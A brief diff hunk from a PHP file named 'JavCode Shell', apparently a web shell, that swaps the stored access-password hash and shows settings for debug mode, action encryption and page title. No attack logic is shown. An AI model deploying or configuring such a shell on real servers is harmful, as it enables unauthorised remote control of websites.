@@ -8,7 +8,7 @@ JavCode Shell
 
 $j_debug		= FALSE;
 $j_encrypted	= TRUE; // Akan mengenskripsi setiap gerakan ;'v
-$j_password		= "f561aaf6ef0bf14d4208bb46a4ccb3ad"; // default password : w
+$j_password		= "ab0d1d0c4c5ece0ff7bc519024361424"; // default password : w
 $j_gethost		= $_SERVER['HTTP_HOST'];
 $j_judul		= "JavCode Shell - ".$j_gethost;
 
